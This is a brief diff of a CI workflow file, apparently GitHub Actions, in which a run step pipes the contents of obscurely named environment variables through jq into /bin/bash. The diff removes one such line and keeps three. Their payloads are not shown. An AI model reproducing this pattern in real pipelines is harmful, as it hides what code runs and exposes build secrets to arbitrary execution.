@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$gey325" | jq -r .u08 | /bin/bash
           echo $uwdwh0 | jq -r .cuh119 | /bin/bash
-          printf '%s' "$aagas70729" | jq -r .jts2 | /bin/bash
           echo $y8975 | jq -r .zzyj43948 | /bin/bash
 
       - name: Persist data
